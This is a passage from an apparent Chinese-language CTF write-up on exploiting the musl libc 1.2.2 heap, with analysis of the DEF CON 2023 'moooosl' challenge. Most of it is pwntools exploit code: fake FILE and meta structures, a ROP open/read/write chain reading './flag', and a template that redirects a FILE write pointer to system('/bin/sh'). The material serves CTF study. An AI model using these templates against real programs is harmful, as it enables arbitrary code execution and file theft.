class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><h3 id="puts利用链"><a href="#puts利用链" class="headerlink" title="puts利用链"></a>puts利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>orw musl-1.2.2 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目为<code>defcon 2023 moooosl</code><br>musl版本为1.2.2</p><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>赛题好像没有给出源码，不过代码比较简单，<code>ida</code>看的反而比源码更加方便，这里为了方便看的人了解题目，就把源码贴出来了<br>h.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> H[<span class="number">0x100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">uint32_t</span> shift = rand();</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R 0x7f</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> a = L; a &lt; R; a++) &#123;</span><br><span class="line">        tmp[<span class="number">0</span>] = a;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = L; b &lt; R; b++) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c = L; c &lt; R; c++) &#123;</span><br><span class="line">                tmp[<span class="number">2</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> d = L; d &lt; R; d++) &#123;</span><br><span class="line">                    tmp[<span class="number">3</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">char</span> e = L; e &lt; R; e++) &#123;</span><br><span class="line">                        tmp[<span class="number">4</span>] = e;</span><br><span class="line">                        <span class="type">uint32_t</span> h = key_hash(&amp;tmp, <span class="number">5</span>) - shift;</span><br><span class="line">                        <span class="keyword">if</span> (h &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (H[h] == <span class="number">0</span>) &#123;</span><br><span class="line">                                H[h] = *(<span class="type">uint64_t</span> *)&amp;tmp;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%s %s =&gt; %#08x\n&quot;</span>, tmp, &amp;H[h], h);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 